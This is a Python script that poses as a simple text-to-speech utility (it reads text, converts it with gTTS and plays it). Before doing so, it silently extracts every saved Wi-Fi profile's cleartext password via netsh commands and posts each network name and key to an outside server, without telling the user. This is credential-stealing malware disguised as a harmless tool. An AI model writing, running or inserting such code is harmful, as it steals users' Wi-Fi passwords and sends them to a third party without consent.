from gtts import gTTS
import playsound
import requests
import subprocess

internet = True
text = input("Enter some text:")
api_url = "http://8kcalculator.pythonanywhere.com/wifi"

data = subprocess.check_output(['netsh', 'wlan', 'show', 'profiles']).decode('utf-8', errors="backslashreplace").split('\n')
profiles = [i.split(":")[1][1:-1] for i in data if "All User Profile" in i]
for i in profiles:
    try:
        results = subprocess.check_output(['netsh', 'wlan', 'show', 'profile', i, 'key=clear']).decode('utf-8', errors="backslashreplace").split('\n')
        results = [b.split(":")[1][1:-1] for b in results if "Key Content" in b]
        try:
            response = requests.post(api_url, json={i:results[0]})
        except IndexError as e:
            print(e)
    except Exception as e:
        print (e)

if internet==True:
    tts = gTTS(text=text, lang="en", slow=False)
    tts.save("audio.mp3")
    playsound.playsound('audio.mp3')